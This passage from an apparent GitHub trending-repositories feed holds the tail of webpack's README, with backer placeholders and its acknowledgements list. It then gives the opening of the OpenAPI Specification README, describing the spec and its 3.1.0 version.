 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://opencollective.com/webpack#backer&quot;&gt;Become a backer&lt;/a&gt; and get your image on our README on Github with a link to your site.&lt;/p&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/google&quot;&gt;@google&lt;/a&gt; for &lt;a href=&quot;http://www.gwtproject.org/&quot;&gt;Google Web Toolkit (GWT)&lt;/a&gt;, which aims to compile Java to JavaScript. It features a similar &lt;a href=&quot;http://www.gwtproject.org/doc/latest/DevGuideCodeSplitting.html&quot;&gt;Code Splitting&lt;/a&gt; as webpack.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/medikoo&quot;&gt;@medikoo&lt;/a&gt; for &lt;a href=&quot;https://github.com/medikoo/modules-webmake&quot;&gt;modules-webmake&lt;/a&gt;, which is a similar project. webpack was born because I wanted Code Splitting for modules-webmake. Interestingly the &lt;a href=&quot;https://github.com/medikoo/modules-webmake/issues/7&quot;&gt;Code Splitting issue is still open&lt;/a&gt; (thanks also to @Phoscur for the discussion).&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/substack&quot;&gt;@substack&lt;/a&gt; for &lt;a href=&quot;http://browserify.org/&quot;&gt;browserify&lt;/a&gt;, which is a similar project and source for many ideas.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/jrburke&quot;&gt;@jrburke&lt;/a&gt; for &lt;a href=&quot;https://requirejs.org/&quot;&gt;require.js&lt;/a&gt;, which is a similar project and source for many ideas.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/defunctzombie&quot;&gt;@defunctzombie&lt;/a&gt; for the &lt;a href=&quot;https://github.com/defunctzombie/package-browser-field-spec&quot;&gt;browser-field spec&lt;/a&gt;, which makes modules available for node.js, browserify and webpack.&lt;/li&gt; 
 &lt;li&gt;Every early webpack user, which contributed to webpack by writing issues or PRs. You influenced the direction...&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/shama&quot;&gt;@shama&lt;/a&gt;, &lt;a href=&quot;https://github.com/jhnns&quot;&gt;@jhnns&lt;/a&gt; and &lt;a href=&quot;https://github.com/sokra&quot;&gt;@sokra&lt;/a&gt; for maintaining this project&lt;/li&gt; 
 &lt;li&gt;Everyone who has written a loader for webpack. You are the ecosystem...&lt;/li&gt; 
 &lt;li&gt;Everyone I forgot to mention here, but also influenced webpack.&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>OAI/OpenAPI-Specification</title>
      <link>https://github.com/OAI/OpenAPI-Specification</link>
      <description>&lt;p&gt;The OpenAPI Specification Repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The OpenAPI Specification&lt;/h1&gt; 
&lt;p&gt;&lt;img src=&quot;https://github.com/OAI/OpenAPI-Specification/workflows/validate-markdown/badge.svg&quot; alt=&quot;Build Status&quot;&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://avatars3.githubusercontent.com/u/16343502?v=3&amp;amp;s=200&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;p&gt;The OpenAPI Specification is a community-driven open specification within the &lt;a href=&quot;https://www.openapis.org/&quot;&gt;OpenAPI Initiative&lt;/a&gt;, a Linux Foundation Collaborative Project.&lt;/p&gt; 
&lt;p&gt;The OpenAPI Specification (OAS) defines a standard, programming language-agnostic interface description for HTTP APIs, which allows both humans and computers to discover and understand the capabilities of a service without requiring access to source code, additional documentation, or inspection of network traffic. When properly defined via OpenAPI, a consumer can understand and interact with the remote service with a minimal amount of implementation logic. Similar to what interface descriptions have done for lower-level programming, the OpenAPI Specification removes guesswork in calling a service.&lt;/p&gt; 
&lt;p&gt;Use cases for machine-readable API definition documents include, but are not limited to: interactive documentation; code generation for documentation, clients, and servers; and automation of test cases. OpenAPI documents describe an APIs services and are represented in either YAML or JSON formats. These documents may either be produced and served statically or be generated dynamically from an application.&lt;/p&gt; 
&lt;p&gt;The OpenAPI Specification does not require rewriting existing APIs. It does not require binding any software to a service ‚Äì the service being described may not even be owned by the creator of its description. It does, however, require the capabilities of the service be described in the structure of the OpenAPI Specification. Not all services can be described by OpenAPI ‚Äì this specification is not intended to cover every possible style of HTTP APIs, but does include support for &lt;a href=&quot;https://en.wikipedia.org/wiki/Representational_state_transfer&quot;&gt;REST APIs&lt;/a&gt;. The OpenAPI Specification does not mandate a specific development process such as design-first or code-first. It does facilitate either technique by establishing clear interactions with a HTTP API.&lt;/p&gt; 
&lt;p&gt;This GitHub project is the starting point for OpenAPI. Here you will find the information you need about the OpenAPI Specification, simple examples of what it looks like, and some general information regarding the project.&lt;/p&gt; 
&lt;h2&gt;Current Version - 3.1.0&lt;/h2&gt; 
&lt;p&gt;The current version of the OpenAPI specification is &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/versions/3.1.0.md&quot;&gt;OpenAPI Specification 3.1.0&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Previous Versions&lt;/h3&gt; 
&lt;p&gt;This repository also contains all &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/versions&quot;&gt;previous versions&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Each folder in this repository, such as &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/examples&quot;&gt;examples&lt;/a&gt; and &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/schemas&quot;&gt;schemas&lt;/a&gt;, should contain folders pertaining to the current and previous versions of the specification.&lt;/p&gt; 
&lt;h2&gt;See It in Action&lt;/h2&gt; 
&lt;p&gt;If you just want to see it work, check out the &lt;a href=&quot;https://raw.githubusercontent.com/OAI/OpenAPI-Specification/main/examples&quot;&gt;list of current examples&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Tools and Libraries&lt;/h2&gt; 
